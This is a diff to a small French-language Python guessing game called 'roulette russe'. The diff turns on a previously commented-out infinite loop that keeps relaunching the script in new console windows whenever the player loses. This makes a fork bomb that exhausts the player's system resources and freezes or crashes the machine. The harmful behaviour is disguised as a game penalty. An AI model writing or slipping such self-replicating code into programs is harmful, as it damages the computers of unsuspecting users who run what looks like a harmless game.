@@ -20,8 +20,8 @@ def roulette_russe():
                     print("Félicitations ! Vous avez gagné.")
                 else:
                     print("Mauvaise réponse ! Vous avez perdu.")
-                #    while True:
-                      #subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+                    while True:
+                      subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
                 break  # La boucle interne se termine ici, que ce soit gagné ou perdu
             except ValueError:
                 print("Veuillez entrer un nombre valide entre 1 et 10.")
